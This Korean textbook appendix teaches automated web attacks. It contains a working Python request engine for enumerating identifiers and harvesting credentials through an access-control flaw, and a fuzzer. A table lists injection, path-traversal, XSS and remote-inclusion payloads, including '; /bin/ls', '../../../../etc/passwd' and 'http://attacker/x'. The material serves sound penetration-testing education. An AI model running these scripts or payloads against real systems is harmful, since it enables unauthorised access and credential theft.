# 부록 B. 자동화된 맞춤 공격과 도구

이 부록은 새로운 취약점 범주를 소개하지 않는다. 대신 웹 애플리케이션을 공격하는 방법론에서 하나의 핵심 요소 — **맞춤 공격을 강화하고 가속하기 위한 자동화** — 를 다룬다. 여기서 다루는 기법은 초기 매핑(→ 25.3)부터 실제 익스플로잇까지 공격의 모든 단계에 적용된다.

모든 웹 애플리케이션은 다르다. 애플리케이션을 효과적으로 공격하려면 그 동작을 이해하고 취약점을 탐침하기 위한 여러 수작업 절차가 필요하고, 경험과 직관을 상상력 있게 동원해야 한다. 공격은 대개 맞춤형이다. 관찰된 특정 동작에, 그리고 애플리케이션이 조작을 허용하는 구체적인 방식에 맞춰진다. 이런 맞춤 공격을 순전히 손으로 수행하는 것은 극도로 지루하고 실수를 부른다. 가장 성공적인 공격자는 맞춤 공격을 한 걸음 더 밀어붙여 그것을 **자동화**한다. 자동화는 인간의 지능과 컴퓨터의 무차별 반복을 결합한다. 이 결합이 대개 파괴적인 결과를 낸다.

이 부록은 부록 A의 방법론과 짝을 이룬다. 부록 A가 "무엇을 점검하는가"를 순서 있는 체크리스트로 정리했다면, 이 부록은 그중 반복 작업을 "어떻게 자동화하는가"를 실제로 동작하는 코드로 보여 준다. 방법론의 여러 단계 — 식별자 열거(→ 24.1), 데이터 수확(→ 24.3), 입력 기반 취약점 탐침(→ A.8) — 은 손으로 하기엔 요청 수가 너무 많다. 자동화가 그 간극을 메운다.

> **이 부록이 서 있는 시점**
>
> 이 부록의 원리는 원서 『The Web Application Hacker's Handbook』 2판(2011)의 14장과 20장을 뼈대로 삼는다. 원서의 예제는 Java(저자들이 JAttack이라 부른 250줄짜리 도구)와 Burp Intruder로 작성됐다. 이 부록은 같은 **원리와 구조**를 따르되 코드는 현대적인 Python으로 다시 썼다. 도구 이름 — Burp Suite, WebScarab, Paros, Nikto, Hydra, Stunnel 등 — 은 모두 2011년 기준이다. 그 이후 등장한 현대 스캐너 제품, 클라우드 기반 테스트 플랫폼, AI 기반 퍼징은 이 부록의 범위 밖이다. 도구 이름은 그 자리에서 해야 할 **작업의 성격**을 가리키는 이름표로 읽으면 된다. 인터셉팅 프록시, 스파이더, 퍼저, 무작위성 검정기 같은 역할은 도구가 바뀌어도 그대로 남는다.

## B.1 맞춤 자동화가 필요한 경우

맞춤 자동화 기법을 동원하면 유리한 상황은 크게 세 가지다. 이 세 가지가 이 부록 앞부분(B.2~B.4)의 골격이다.

**식별자 열거(enumerating identifiers).** 대부분의 애플리케이션은 데이터와 리소스를 가리키는 데 여러 종류의 이름과 식별자를 쓴다. 계좌 번호, 사용자명, 문서 ID 같은 것이다. 어느 값이 유효한지, 또는 더 조사할 가치가 있는지 알아내려면 수많은 후보 식별자를 순회해야 한다. 예를 들어 다음 URL은 페이지 번호 파라미터로 특정 콘텐츠를 조회한다.

```
http://mdsec.net/app/ShowPage.ashx?PageNo=10069
```

애플리케이션을 둘러보는 과정에서 유효한 `PageNo` 값을 여럿 발견하더라도, 유효한 값을 **전부** 찾으려면 전체 범위를 순회해야 한다. 손으로는 현실적으로 불가능하다.

**데이터 수확(harvesting data).** 많은 종류의 취약점은 특정하게 조작된 요청으로 애플리케이션에서 유용하거나 민감한 데이터를 뽑아내게 해 준다. 예를 들어 개인 프로필 페이지가 현재 사용자의 개인·금융 정보와 권한 수준을 표시한다고 하자. 접근 제어 결함(→ 24.3)을 통해 임의 사용자의 프로필을 볼 수 있게 됐다면 — 단, 한 번에 한 명씩만 — 전체 사용자의 데이터를 수확하는 데 수천 번의 요청이 필요하다. 손으로 하는 대신, 맞춤 자동화로 이 데이터를 유용한 형태로 빠르게 포착한다.

**퍼징(fuzzing).** 흔한 취약점을 탐지하는 가장 좋은 접근은 예상 밖의 데이터와 공격 문자열을 제출하고 이상 징후가 있는지 응답을 검토하는 것이다(→ A.8). 큰 애플리케이션이라면 초기 매핑에서 탐침해야 할 요청이 수십 개, 각 요청의 파라미터가 여럿이다. 하나하나 손으로 시험하면 시간이 많이 들고 정신이 마비되며, 공격 표면의 상당 부분이 방치된다. 맞춤 자동화를 쓰면 흔한 공격 문자열을 담은 요청을 대량으로 빠르게 생성하고 서버 응답을 평가해, 더 조사할 흥미로운 사례로 좁혀 들어갈 수 있다.

이 세 상황을 차례로 자세히 살펴본다. 세 상황의 자동화 기법은 공통 골격을 공유한다. **요청을 구조화된 파라미터의 집합으로 다루고, 특정 파라미터에 페이로드를 주입하며, 응답에서 무엇이 달라졌는지 판정한다.** 이 골격을 코드로 세워 두면 세 상황 모두에 재사용할 수 있다.

## B.2 유효한 식별자 열거 — 기본 접근법, 히트 탐지, 공격 스크립팅

식별자를 열거하는 자동 공격을 세우려면 세 가지 요소가 필요하다.

1. **대상 파라미터 식별** — 표적 식별자를 담은 파라미터를 가진 요청/응답 쌍을 찾는다.
2. **페이로드 생성** — 후보 식별자 목록을 순회하거나, 사용 중인 식별자의 구문 범위를 순회한다.
3. **히트 탐지** — 응답의 무엇이 유효/무효를 가르는지 판정한다.

이 세 요소 중 **히트 탐지가 이 절의 핵심**이다. 페이로드를 아무리 많이 던져도 히트를 가릴 수 없으면 결과는 잡음일 뿐이다. 이는 30.3절(추론을 통한 정보 수집)이 다룬 것과 같은 구조다. 응답의 어떤 속성이 관측 가능한 채널이 되어 서버 내부 상태를 새어 나오게 하는가를 묻는 것이다.

### B.2.1 기본 접근법 — 적합한 요청/응답 쌍 찾기

자동 공격의 첫 과제는 다음 두 성질을 가진 요청/응답 쌍을 찾는 것이다.

- 요청이 표적 식별자를 담은 파라미터를 포함한다. 예: 페이지를 표시하는 기능에서 `PageNo=10069`.
- 파라미터 값을 바꿀 때 서버 응답이 **체계적으로** 달라진다. 예: 유효한 `PageNo`면 문서 내용을 담은 응답을, 무효한 값이면 일반 오류 메시지를 반환한다.

이런 쌍을 찾았으면, 후보 식별자 목록이나 식별자의 구문 범위를 순회하며 대량의 자동 요청을 보내고, 유효한 식별자가 제출됐음을 알리는 "히트"를 응답에서 감시한다.

이 요구는 여러 상황에서 발생한다. 로그인 기능이 실패 원인(미인식 사용자명 vs 잘못된 비밀번호)을 구별하는 메시지를 반환하면, 흔한 사용자명 목록을 순회해 유효한 사용자명 목록으로 좁힐 수 있다(→ 22.2). 이 목록은 다시 비밀번호 추측 공격의 재료가 된다. 애플리케이션이 문서 ID·계좌 번호·직원 번호로 리소스를 가리키고 특정 식별자의 유효성을 확인하는 수단을 노출하면, 구문 범위를 순회해 리소스 전체 목록을 얻는다. 세션 토큰이 예측 가능하면(→ 23.2), 발급받은 일련의 토큰으로부터 외삽해 다른 사용자의 세션을 탈취할 수도 있는데, 이때 확인된 유효 값 하나당 다수의 후보 토큰을 시험해야 한다.

### B.2.2 히트 탐지 — 응답의 무엇이 다른가

응답에는 체계적 변화가 나타날 수 있는 속성이 여럿 있고, 각각이 자동 공격의 판정 기준이 된다. 다음 표가 그 채널의 목록이다.

**표 B-1. 히트 탐지 채널**

| 채널 | 무엇을 보는가 | 대표 사례 |
|---|---|---|
| HTTP 상태 코드 | 200/301·302/401·403/404/500의 체계적 차이 | 유효 ID면 200, 무효면 500 |
| 응답 길이 | 고정 길이 템플릿에 삽입되는 per-response 콘텐츠의 유무 | 유효 문서 ID면 본문이 채워져 길이 증가 |
| 응답 본문 | 특정 리터럴 문자열이나 패턴의 존재 | `invalid document id` 문자열 |
| Location 헤더 | 리다이렉션 대상의 차이 | 유효하면 `/download.jsp`, 무효하면 `/error.jsp` |
| Set-Cookie 헤더 | 특정 조건에서만 쿠키가 설정됨 | 유효 자격증명일 때만 세션 토큰 발급 |
| 응답 시간 | 응답 내용은 같으나 처리 시간이 미묘하게 다름 | 유효 사용자명일 때 백엔드 검증으로 지연 발생 |

각 채널을 조금 더 풀어 본다.

**상태 코드.** 가장 흔히 마주치는 값은 200(OK), 301·302(리다이렉션), 401·403(비인가), 404(리소스 없음), 500(서버 오류)이다. 애플리케이션이 파라미터 값에 따라 상태 코드를 체계적으로 바꾸는 경우가 많다.

**응답 길이.** 동적 페이지는 고정 길이 템플릿에 per-response 콘텐츠를 삽입해 응답을 구성하는 일이 흔하다. 콘텐츠가 없거나 무효하면(잘못된 문서 ID) 빈 템플릿을 그대로 반환한다. 이때 응답 길이가 유효성의 신뢰할 만한 지표가 된다. 저자들의 경험상 **상태 코드와 응답 길이 두 지표만으로 대부분의 경우 이상 응답을 매우 안정적으로 식별할 수 있다.**

**응답 본문.** 상태 코드가 변하지 않고 동적 콘텐츠 때문에 전체 길이가 흔들리는 경우, 특정 문자열이나 패턴을 응답에서 검색하는 것이 가장 신뢰할 만한 히트 판정이 되기도 한다.

**Location 헤더.** 매 요청에 301·302로 응답하되 리다이렉션 대상이 파라미터에 따라 달라지는 경우, Location 헤더로 히트를 식별한다.

**Set-Cookie 헤더.** 어떤 파라미터 집합에도 동일하게 응답하되 특정 조건에서만 쿠키를 설정하는 경우가 있다. 예를 들어 모든 로그인 요청이 같은 리다이렉션을 받되, 유효 자격증명일 때만 세션 토큰 쿠키가 설정된다.

**응답 시간.** 유효·무효 응답의 내용이 동일하지만 응답에 걸리는 시간이 미묘하게 다를 수 있다. 무효 사용자명이면 즉시 일반 메시지를 반환하지만, 유효 사용자명이면 계산 비용이 큰 백엔드 검증을 거친 뒤 같은 메시지를 반환하는 식이다. 이 시간 차를 원격에서 감지할 수 있으면 히트 판별자로 쓸 수 있다. (이 버그는 구버전 OpenSSH 같은 다른 소프트웨어에서도 자주 발견된다.)

히트 지표를 고를 때의 일차 목표는 **완전히 신뢰할 수 있는 하나**를, 또는 함께 봤을 때 신뢰할 수 있는 **한 무리**를 찾는 것이다. 그러나 히트가 어떤 모습인지 사전에 모를 때도 있다. 사용자명 열거에서 유효한 사용자명 하나조차 없어 히트 시의 동작을 확정할 수 없는 경우가 그렇다. 이때는 위의 모든 속성을 함께 기록하고 이상치를 찾는 것이 최선이다.

### B.2.3 공격 스크립팅 — 단순 스크립트에서 구조화된 도구로

다음 URL이 유효한 `PageNo`에 200을, 그렇지 않으면 500을 반환한다고 하자. 앞의 두 조건을 만족하므로 자동 공격이 가능하다.

```
http://mdsec.net/app/ShowPage.ashx?PageNo=10069
```

이렇게 단순한 경우 스크립트를 빠르게 만드는 것으로 충분하다. 다음은 표준 입력으로 후보 페이지 ID 목록을 읽어 각 ID로 URL을 요청하고, 응답 첫 줄(상태 코드 포함)을 기록하는 셸 스크립트다.

```bash
#!/bin/bash
server=mdsec.net
port=80
while read id; do
  printf "%s\t" "$id"
  printf "GET /app/ShowPage.ashx?PageNo=%s HTTP/1.0\r\nHost: %s\r\n\r\n" "$id" "$server" \
    | nc "$server" "$port" | head -1
done | tee outputfile
```

`curl`로도 같은 일을 할 수 있다. 다음은 상태 코드만 걸러 낸다.

```bash
while read id; do
  printf "%s: " "$id"
  curl -s -o /dev/null -w "%{http_code}\n" "http://mdsec.net/app/ShowPage.ashx?PageNo=$id"
done < IDs.txt
```

이런 단순 스크립트는 파라미터 값 목록을 순회하며 응답의 단일 속성을 파싱하는 정도의 작업에 이상적이다. 그러나 대개는 명령줄 스크립팅이 쉽게 제공하지 못하는 힘과 유연성이 필요하다. 문자열 기반 데이터를 쉽게 다루고 소켓·SSL에 접근할 수 있는 고수준 객체지향 언어가 낫다. Java, C#, Python이 이 조건을 만족한다. 원서는 Java로 JAttack을 만들었다. 여기서는 같은 구조를 Python으로 세운다.

핵심은 요청을 구조 없는 텍스트 덩어리가 아니라 **파라미터의 집합**으로 다루는 것이다. 파라미터는 이름, 값, 위치(URL 쿼리·쿠키·본문), 그리고 이번 공격에서 변형 대상인지 여부를 가진다.

```python
# jattack.py — 맞춤 자동화 공격 엔진 (원서 JAttack의 구조를 Python으로 재구현)
import socket
from dataclasses import dataclass

URL, COOKIE, BODY = "URL", "COOKIE", "BODY"

@dataclass
class Param:
    name: str
    value: str
    type: str          # URL / COOKIE / BODY
    attack: bool       # 이번 공격에서 이 파라미터를 변형하는가
```

`attack` 필드는 어떤 파라미터를 이번 공격에서 변형할지 표시한다. 변형하지 않지만 공격 성공에 필요한 파라미터(세션 쿠키 등)는 그대로 실려야 하기 때문이다.

선택한 파라미터의 값을 조작하려면 **페이로드 소스(payload source)** 개념이 필요하다. 공격 유형마다 다른 소스가 필요하므로, 모든 소스가 구현할 공통 인터페이스를 먼저 정한다. `next_payload()`는 소스의 상태를 전진시키며 페이로드가 남아 있는 동안 참을 반환하고, `reset()`은 초기 상태로 되돌리며, `get_payload()`는 현재 페이로드를 반환한다.

```python
class PayloadSource:
    def next_payload(self) -> bool: raise NotImplementedError
    def reset(self) -> None: raise NotImplementedError
    def get_payload(self) -> str: raise NotImplementedError

class PSNumbers(PayloadSource):
    """지정 범위의 숫자를 순회한다."""
    def __init__(self, frm, to, step):
        self.frm, self.to, self.step = frm, to, step
        self.reset()
    def next_payload(self):
        self.current += self.step
        return self.current <= self.to
    def reset(self):
        self.current = self.frm - self.step
    def get_payload(self):
        return str(self.current)
```

파라미터와 페이로드 소스를 갖췄으면 요청을 생성하고 응답을 처리하는 엔진을 만든다. 엔진은 지금 어느 파라미터를 표적으로 삼는지, 어느 페이로드를 넣을지 상태를 유지한다.

```python
class JAttack:
    def __init__(self, host, port, method, url, params, payloads):
        self.host, self.port, self.method, self.url = host, port, method, url
        self.params, self.payloads = params, payloads
        self.current_param = 0

    def next_request(self):
        """다음 요청으로 상태를 전진시킨다. 남은 요청이 없으면 False."""
        if self.current_param >= len(self.params):
            return False
        if not self.params[self.current_param].attack:
            self.current_param += 1
            return self.next_request()
        if not self.payloads.next_payload():
            self.payloads.reset()
            self.current_param += 1
            return self.next_request()
        return True

    def build_request(self):
        url_parts, cookie_parts, body_parts = [], [], []
        for i, p in enumerate(self.params):
            value = self.payloads.get_payload() if i == self.current_param else p.value
            if p.type == URL:    url_parts.append(f"{p.name}={value}")
            elif p.type == COOKIE: cookie_parts.append(f"{p.name}={value}")
            elif p.type == BODY:   body_parts.append(f"{p.name}={value}")
        line = f"{self.method} {self.url}"
        if url_parts:
            line += "?" + "&".join(url_parts)
        req = [f"{line} HTTP/1.0", f"Host: {self.host}"]
        if cookie_parts:
            req.append("Cookie: " + "; ".join(cookie_parts))
        body = "&".join(body_parts)
        if body:
            req.append("Content-Type: application/x-www-form-urlencoded")
            req.append(f"Content-Length: {len(body)}")   # 정확한 길이 필수
        return "\r\n".join(req) + "\r\n\r\n" + body

    def issue_request(self, req):
        with socket.create_connection((self.host, self.port)) as s:
            s.sendall(req.encode())
            chunks = []
            while True:
                data = s.recv(4096)
                if not data: break
                chunks.append(data)
        return b"".join(chunks).decode(errors="replace")

    def parse_response(self, resp):
        status = resp.split()[1] if len(resp.split()) > 1 else "?"
        return f"{status}\t{len(resp)}"

    def do_attack(self):
        print("param\tpayload\tstatus\tlength")
        while self.next_request():
            try:
                out = self.parse_response(self.issue_request(self.build_request()))
            except Exception as e:
                out = str(e)
            print(f"{self.params[self.current_param].name}\t{self.payloads.get_payload()}\t{out}")
```

> **NOTE — Content-Length의 정확성**
>
> POST 요청을 직접 생성한다면 각 요청에 본문의 실제 길이를 담은 유효한 Content-Length 헤더를 반드시 넣어야 한다. 무효한 Content-Length를 보내면 대부분의 웹 서버는 제출한 데이터를 잘라 버리거나, 더 많은 데이터가 오기를 무한정 기다린다(→ 10.2).

페이지 열거 공격의 설정과 실행은 다음과 같다.

```python
if __name__ == "__main__":
    params = [Param("PageNo", "10069", URL, True)]
    JAttack("mdsec.net", 80, "GET", "/app/ShowPage.ashx",
            params, PSNumbers(10060, 10080, 1)).do_attack()
```

출력은 파라미터·페이로드·상태·길이의 탭 구분 표다. 보통의 네트워크와 연산 자원이면 분당 수백 건의 요청을 낼 수 있어, 유효한 문서 식별자를 빠르게 찾아낸다. 겉보기엔 셸 스크립트와 다를 바 없어 보이지만, 이 엔진은 다수 파라미터, 다양한 페이로드 소스, 임의로 복잡한 응답 처리를 손쉽게 얹을 수 있도록 설계됐다. 다음 절들은 여기에 작은 확장을 더해 훨씬 강력하게 만든다.

## B.3 유용한 데이터 수확

맞춤 자동화의 두 번째 용도는 조작된 요청으로 유용하거나 민감한 데이터를 한 번에 한 항목씩 뽑아내는 것이다. 접근 제어 결함처럼 익스플로잇 가능한 취약점을 이미 찾은 상황에서 가장 흔하게 쓰인다. 예를 들면 다음과 같다.

- 온라인 소매 애플리케이션에서 다른 고객의 주문 번호를 알아내면, 자기 주문처럼 그들의 주문 정보를 볼 수 있다.
- 분실 비밀번호 기능이 사용자가 설정한 챌린지에 의존하면, 임의 사용자명을 제출해 연관된 챌린지를 볼 수 있다. 열거·추측한 사용자명 목록을 순회해 추측하기 쉬운 챌린지를 가려낸다.
- 사용자의 권한 수준을 표시하는 기능이 있으면, 사용자 ID 범위를 순회해 관리자 사용자 목록을 얻는다.

데이터 수확의 기본 접근은 식별자 열거와 본질적으로 같다. 다만 이제 관심은 이진 결과(히트/미스)에 그치지 않고, **각 응답의 내용 일부를 사용 가능한 형태로 추출하는 것**까지 나아간다.

다음 요청을 보자. 로그인한 사용자가 자기 계정 정보를 표시하는 요청이다.

```
GET /auth/498/YourDetails.ashx?uid=198 HTTP/1.1
Host: mdsec.net
Cookie: SessionId=0947F6DC9A66D29F15362D031B337797
```

이 기능은 인증된 사용자만 접근 가능하지만, `uid`만 바꾸면 임의 사용자의 정보를 볼 수 있는 접근 제어 취약점이 있다(→ 24.3). 더구나 노출되는 정보에 사용자의 전체 자격증명이 포함된다. 사용자의 상세 정보가 표시될 때 페이지 소스는 다음과 같은 HTML 테이블 안에 개인 데이터를 담는다.

```html
<tr><td>Name: </td><td>Phill Bellend</td></tr>
<tr><td>Username: </td><td>phillb</td></tr>
<tr><td>Password: </td><td>b3ll3nd</td></tr>
```

수확을 위해 엔진에 두 가지를 더한다. 첫째, 관심 콘텐츠 앞에 오는 정적 문자열 목록을 설정에 추가한다. 둘째, 각 응답에서 그 문자열을 찾아 바로 뒤에 오는 값을 다음 꺾쇠(`<`)까지 추출한다.

```python
class JAttackHarvest(JAttack):
    extract_strings = [
        "<td>Name: </td><td>",
        "<td>Username: </td><td>",
        "<td>Password: </td><td>",
    ]
    def parse_response(self, resp):
        out = [super().parse_response(resp)]
        for marker in self.extract_strings:
            frm = resp.find(marker)
            if frm == -1:
                continue
            frm += len(marker)
            to = resp.find("<", frm)
            if to == -1:
                to = len(resp)
            out.append(resp[frm:to])
        return "\t".join(out)
```

공격 설정은 두 파라미터를 담되 `uid`만 변형한다. 세션 쿠키는 그대로 실어 인증 상태를 유지한다.

```python
params = [
    Param("SessionId", "0947F6DC9A66D29F15362D031B337797", COOKIE, False),
    Param("uid", "198", URL, True),
]
JAttackHarvest("mdsec.net", 80, "GET", "/auth/498/YourDetails.ashx",
               params, PSNumbers(190, 200, 1)).do_attack()
```

숫자 범위를 넓히면 애플리케이션 전체 사용자의 로그인 정보를 추출할 수 있고, 운이 좋으면 관리자도 포함된다. **탭 구분 형식으로 출력하면 스프레드시트로 바로 불러들여 정리할 수 있다.** 한 수확 작업의 출력이 다른 자동 공격의 입력이 되는 일도 잦다. 관심 콘텐츠 앞의 문자열이 정적이지 않고 가변적일 때는, 값을 감싸는 문자열을 정규표현식으로 포착하거나 데이터 앞뒤의 안정적인 경계 표지를 함께 지정해 추출한다.

> **이 절이 뒷받침하는 것**
>
> - `uid` 순회를 통한 무단 프로필 열람 → **24.3** (접근 제어 공격), **24.4** (제한된 접근으로 테스트)
> - 추출한 자격증명 목록의 재사용 → **22.2** (비밀번호 추측의 재료)

## B.4 흔한 취약점에 대한 퍼징

세 번째 용도는 알려진 취약점을 겨냥하는 것이 아니다. 특정 흔한 취약점이 있으면 이상 동작을 유발하도록 설계된 여러 공격 문자열로 애플리케이션을 탐침하는 것이다. 이 공격은 앞의 둘보다 훨씬 덜 집중적이다.

- 각 파라미터의 정상 기능이나 기대 데이터 유형과 무관하게, **같은 공격 페이로드 집합을 모든 페이지의 모든 파라미터에 제출한다.** 이 페이로드를 퍼즈 문자열(fuzz string)이라 부른다.
- 히트를 어떻게 식별할지 사전에 정확히 모른다. 특정 성공 지표를 감시하는 대신, 가능한 한 많은 세부를 명료한 형태로 포착한다. 그런 뒤 검토하며 공격 문자열이 이상 동작을 유발한 사례를 찾는다.

일부 취약점은 특정 오류 메시지나 상태 코드처럼 알아볼 수 있는 방식으로 드러난다. 이런 **취약점 시그니처**는 흔한 결함을 탐지하는 데 쓸 수 있고, 자동 스캐너가 발견의 대부분을 잡아내는 수단이기도 하다(→ B.7). 그러나 원리상 어떤 시험 문자열이든 그 맥락에서 취약점의 존재를 가리키는 예상 밖의 동작을 낳을 수 있다. 그래서 맞춤 자동화를 쓰는 숙련된 공격자가 완전 자동 도구보다 대개 훨씬 효과적이다. 사람은 응답의 모든 세부를 지능적으로 분석하고, 설계자·개발자처럼 사고하며, 어떤 도구도 못 잡는 요청·응답 사이의 비정상적 연결을 포착한다.

### B.4.1 퍼즈 문자열과 판정 기준

초기 탐색으로 각 파라미터에 다음 문자열을 차례로 제출한다고 하자. 각 문자열은 특정 취약점 유형을 겨냥하며, 판정 기준이 다르다.

**표 B-2. 취약점 유형별 퍼즈 문자열과 판정 기준**

| 취약점 유형 | 대표 퍼즈 문자열 | 히트 판정 기준 | 본문 |
|---|---|---|---|
| SQL 인젝션 | `'` (작은따옴표 하나) | ODBC/SQL 오류 메시지(`quotation`, `syntax`), 응답 길이 변화 | → 27.3 |
| SQL 인젝션(블라인드) | `1 waitfor delay '0:0:30'--` | 지정 시간만큼의 응답 지연 | → 27.6 |
| OS 명령 인젝션 | `; /bin/ls` , `| ping -c 10 127.0.0.1` | 명령 출력의 반향, 또는 유발된 시간 지연 | → 28.1 |
| 경로 순회 | `../../../../etc/passwd` , `..\..\win.ini` | 대상 파일 내용의 반향, 또는 응답 차이 | → 28.3 |
| 크로스 사이트 스크립팅 | `xsstest<b>` , `"><script>` | 마크업이 인코딩 없이 응답에 그대로 반향됨 | → 32.5 |
| 파일 인클루전 | `http://attacker/x` , `/etc/passwd%00` | 원격 콘텐츠 포함, 또는 로컬 파일 노출 | → 28.4 |

판정 기준의 성격은 유형마다 다르다. SQL 인젝션과 XSS는 **응답 내용**(오류 문자열, 반향된 마크업)으로, 블라인드 SQL 인젝션과 시간 기반 명령 인젝션은 **응답 시간**으로, 경로 순회는 **파일 내용의 등장 여부**로 판정한다. 히트 탐지의 여섯 채널(B.2.2)이 여기서 그대로 재사용된다.

### B.4.2 퍼저 확장

엔진에 퍼즈 문자열 소스와, 응답에서 흔한 오류 문자열을 검색하는 grep 기능을 더하면 기본적인 웹 애플리케이션 퍼저가 된다.

```python
class PSFuzzStrings(PayloadSource):
    fuzz_strings = ["'", ";/bin/ls", "../../../../etc/passwd", "xsstest"]
    def __init__(self):
        self.current = -1
    def next_payload(self):
        self.current += 1
        return self.current < len(self.fuzz_strings)
    def reset(self):
        self.current = -1
    def get_payload(self):
        return self.fuzz_strings[self.current]

class JAttackFuzz(JAttack):
    grep_strings = ["error", "exception", "illegal", "quotation", "not found", "xsstest"]
    def parse_response(self, resp):
        out = [super().parse_response(resp)]
        low = resp.lower()
        for g in self.grep_strings:
            if g in low:
                out.append(g)
        return "\t".join(out)
```

공격은 두 파라미터를 모두 변형하되 퍼즈 문자열을 페이로드로 쓴다.

```python
params = [
    Param("SessionId", "C1F5AFDD7DF969BD1CD2CE40A2E07D19", COOKIE, True),
    Param("uid", "198", URL, True),
]
JAttackFuzz("mdsec.net", 80, "GET", "/auth/498/YourDetails.ashx",
            params, PSFuzzStrings()).do_attack()
```

**한 번에 한 파라미터씩** 변형하는 것이 중요하다. 나머지 파라미터를 원래 값으로 두어야 어느 파라미터가 이상 동작을 일으켰는지 특정할 수 있다. 엔진의 `next_request`가 이 순회를 보장한다.

출력을 손으로 검토해 이상 결과를 찾는다. 예를 들어 `SessionId`를 변형한 요청은 항상 같은 길이의 리다이렉션으로 응답한다. 이는 취약점을 가리키지 않는다. 로그인 상태에서 세션 토큰을 바꾸면 세션이 무효화되고 로그인으로 리다이렉션되는 것이 정상이다. 반면 `uid` 파라미터는 흥미롭다. 모든 변형이 `exception` 문자열을 담은 응답을, 그것도 길이가 제각각인 응답을 낸다. 이는 페이로드마다 다른 응답이 나온다는 뜻이라, 일반 오류 메시지가 아닐 공산이 크다. 작은따옴표를 제출했을 때 응답에 `quotation`이 나타나면 SQL 오류 메시지의 일부일 가능성이 높다 — SQL 인젝션 결함일 수 있으니 확인해야 한다(→ 27.3). `xsstest`가 응답에 반향되면 XSS 가능성을 더 탐침한다(→ 32.5).

> **NOTE** — 진지한 퍼징이라면 여기 든 것보다 훨씬 많은 공격 문자열을 동원해야 한다. 부록 C(소스 코드에서 취약점 찾기)의 시그니처 목록과 각 본문 장의 페이로드 표가 그 재료다.

## B.5 인터셉팅 프록시와 공격 도구 활용

B.2~B.4의 엔진은 250줄도 안 되는 코드로 두 개의 심각한 취약점을 몇 초 만에 드러냈다. 그러나 이런 도구를 쓰기 시작하면 곧 더 있으면 좋을 기능이 눈에 띈다. 표적 요청을 소스 코드에 매번 설정하고 재컴파일하는 대신 실행 시점에 동적으로 구성하고 싶고, 여러 페이로드 소스를 서로 다른 파라미터에 주입하고 싶으며, 모든 응답을 저장해 즉시 검토하고, SSL·HTTP 인증·멀티스레드·자동 리다이렉션 추적·페이로드 자동 인코딩을 지원하고 싶어진다. 이 모든 것을 갖춘 것이 **통합 테스트 스위트**다. 정찰 도구 절(→ 25.8)에서 소개한 도구들이 여기서 실제 공격에 동원된다.

### B.5.1 통합 테스트 스위트의 구조

초창기 인터셉팅 프록시(Achilles 등)는 요청·응답을 편집용으로 표시할 뿐인 독립 도구였다. 수년에 걸쳐 이것이 여러 상호 연결된 도구를 담은 스위트로 진화했다. 웹 보안 테스터가 흔히 쓰는 스위트로 Burp Suite, WebScarab, Paros, Zed Attack Proxy, Fiddler 등이 있다. 순수 기능 면에서는 Burp Suite가 가장 정교하다. 전형적인 스위트의 핵심 구성 요소는 다음과 같다.

- **인터셉팅 프록시** — 스위트의 심장. 유일하게 필수인 구성 요소다.
- **웹 애플리케이션 스파이더** — 링크를 따라가며 콘텐츠를 발견한다.
- **맞춤형 퍼저** — B.2~B.4의 엔진에 해당하는 자동화 도구(Burp Intruder).
- **취약점 스캐너** — 흔한 취약점을 자동 점검한다(→ B.7).
- **수동 요청 도구(리피터)** — 단일 요청을 반복 수정·재발행한다.
- **세션 토큰 분석기(시퀀서)** — 토큰의 무작위성을 통계적으로 검정한다(→ 23.2).

이 도구들은 표적 애플리케이션 정보를 공유한다. 공격자는 브라우저로 애플리케이션을 정상적으로 사용하고, 프록시가 그 요청·응답을 감시·저장하며, 흥미로운 항목을 다른 도구로 넘긴다. 프록시에서 요청을 잡아 Intruder로 넘겨 퍼징하고, 흥미로운 결과를 리피터로 넘겨 확인·익스플로잇하는 식이다.

### B.5.2 인터셉팅 프록시와 HTTPS

프록시를 쓰려면 브라우저의 프록시 서버를 로컬 포트(보통 8080)로 설정한다. 프록시는 브라우저·서버 양방향 통신에 접근하므로 각 메시지를 검토·수정용으로 세워 둘 수 있다.

암호화되지 않은 HTTP에서 인터셉팅 프록시는 일반 웹 프록시처럼 동작한다(→ 13.2). HTTPS는 다르다. 브라우저는 먼저 CONNECT 메서드로 목적지 호스트·포트를 지정하는 평문 요청을 프록시에 보낸다(→ 13.10). 일반(비인터셉팅) 프록시는 200으로 응답하고 이후 TCP 릴레이로만 동작하며, 브라우저는 목적지 서버와 직접 SSL 핸드셰이크를 한다. **인터셉팅** 프록시는 달라야 한다. CONNECT에 200으로 응답한 뒤 릴레이가 아니라 서버 역할로 브라우저와 SSL 핸드셰이크를 하고, 동시에 클라이언트 역할로 목적지 서버와 두 번째 핸드셰이크를 한다. 두 개의 SSL 터널이 생기고 프록시가 그 사이에 앉는다. 이로써 프록시는 각 메시지를 복호화해 평문에 접근하고 다시 암호화해 반대편 터널로 보낸다.

이는 사실상 자발적인 중간자 공격이다(→ 19.9). SSL 핸드셰이크는 인증서로 상대 신원을 검증하므로, 프록시는 목적지 서버의 개인 키가 없어 자체 인증서를 제시해야 하고 브라우저는 경고를 띄운다. 이 문제를 매끄럽게 푸는 방법은 프록시가 설치 시 생성한 **고유 CA 인증서**를 브라우저의 신뢰 루트로 설치하는 것이다. 그러면 프록시가 도메인마다 즉석에서 만들어 이 CA로 서명한 호스트 인증서가 모두 유효로 받아들여져 SSL 오류가 사라진다.

프록시를 인식하지 못하는 시크 클라이언트(thick client)를 테스트할 때는 운영체제 hosts 파일로 대상 호스트명을 루프백(127.0.0.1)으로 돌리고, Burp의 비가시(invisible) 프록시 리스너로 비프록시형 요청을 받은 뒤, Burp의 호스트명 해석 설정으로 원래 IP로 다시 내보낸다.

### B.5.3 페이로드 위치 지정과 응답 분석

Burp Intruder는 B.2의 엔진과 비슷한 개념 모델을 쓰되, 페이로드를 파라미터 값뿐 아니라 값의 일부, 파라미터 이름, 헤더나 본문의 임의 위치에 놓을 수 있다. 각 페이로드 위치는 한 쌍의 마커로 표시한다. 페이로드가 삽입되면 마커 사이 텍스트가 덮이고, 삽입되지 않으면 원래 텍스트가 제출된다. 이것이 한 번에 한 파라미터씩 시험하게 해 준다(B.4.2와 같은 원리). Auto 버튼은 모든 URL·쿠키·본문 파라미터 값에 위치를 자동 설정한다. **sniper** 공격 유형이 가장 자주 쓰이며, 한 위치씩 표적으로 삼아 모든 페이로드를 제출하고 다음 위치로 넘어간다 — B.2 엔진의 `next_request`와 정확히 같은 방식이다.

